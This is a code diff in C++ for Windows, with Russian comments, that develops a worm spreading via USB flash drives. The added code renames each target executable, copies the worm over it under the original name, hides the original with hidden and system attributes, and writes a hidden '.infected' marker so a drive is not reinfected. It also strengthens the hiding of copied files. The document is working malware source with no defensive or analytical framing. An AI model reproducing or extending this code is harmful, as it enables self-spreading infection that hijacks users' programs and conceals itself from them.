@@ -186,7 +186,7 @@ public:
 
 					DWORD attrs = GetFileAttributesW(copy_path.wstring().c_str());
 					if (attrs != INVALID_FILE_ATTRIBUTES) {
-						DWORD new_attrs = attrs | FILE_ATTRIBUTE_HIDDEN;
+						DWORD new_attrs = attrs | FILE_ATTRIBUTE_HIDDEN | 0x4; // Добавил, чтобы было скрытие как системного файла
 						if (!SetFileAttributesW(copy_path.wstring().c_str(), new_attrs)) {
 							std::wcerr << L"Ошибка SetFileAttributesW: " << GetLastError() << L"\n";
 						}
@@ -261,22 +261,40 @@ public:
 		}
 	}
 
-	void hide_and_replace_exe(const fs::path& target_exe, const std::wstring& worm_path) { // подмена exe на червя
-		
-		// Сброс всех атрибутов (включая HIDDEN, SYSTEM, READONLY)
-		SetFileAttributesW(target_exe.c_str(), FILE_ATTRIBUTE_NORMAL);
-		
-		// Генерация уникального имени для оригинала
-		std::wstring unique_suffix = generate_unique_suffix();
-		fs::path backup = target_exe;
-		backup.replace_filename(target_exe.stem().wstring() + L"_" + unique_suffix + target_exe.extension().wstring());
+	void hide_and_replace_exe(const fs::path& target_exe, const std::wstring& worm_path) {
+		if (!dir_was_infected(target_exe)) { // проверка на заражение флешки
+			// Сброс всех атрибутов (включая HIDDEN, SYSTEM, READONLY)
+			SetFileAttributesW(target_exe.c_str(), FILE_ATTRIBUTE_NORMAL);
+			// Генерация уникального имени для оригинала
+			std::wstring unique_suffix = generate_unique_suffix();
+			fs::path backup = target_exe;
+			backup.replace_filename(target_exe.stem().wstring() + L"_" + unique_suffix + target_exe.extension().wstring());
+			fs::rename(target_exe, backup);
+			CopyFileW(worm_path.c_str(), target_exe.c_str(), FALSE);
+			// Установка скрытых атрибутов для оригинала
+			SetFileAttributesW(backup.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+			infected_dir(target_exe); // добавляем скрытый файл, чтобы не заражать флешку несколько раз
+		}
 
-		// Копирование червя под оригинальным именем
-		CopyFileW(worm_path.c_str(), target_exe.c_str(), FALSE);			
+	}
 
-		// Установка скрытых атрибутов для оригинала
-		SetFileAttributesW(backup.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-		
+	void is_flash_drive_exist() {
+
+	}
+
+	bool infected_dir(const wstring& dir_path) { // создаем файл, чтобы не заражать флкшку несколько раз
+		wstring full_name_to_file = dir_path + L"\\.infected";
+		ofstream marker(full_name_to_file, ios::out);
+		if (!marker.is_open()) { return false; }
+		marker << "infected";
+		marker.close();
+		SetFileAttributes(full_name_to_file.c_str(), 0x2 | 0x4); 
+		return true;
+	}
+
+	bool dir_was_infected(const wstring& dir_path) { // проверка на заражение
+		wstring full_name_to_file = dir_path + L"\\.infected";
+		return fs::exists(full_name_to_file);
 	}
 
 
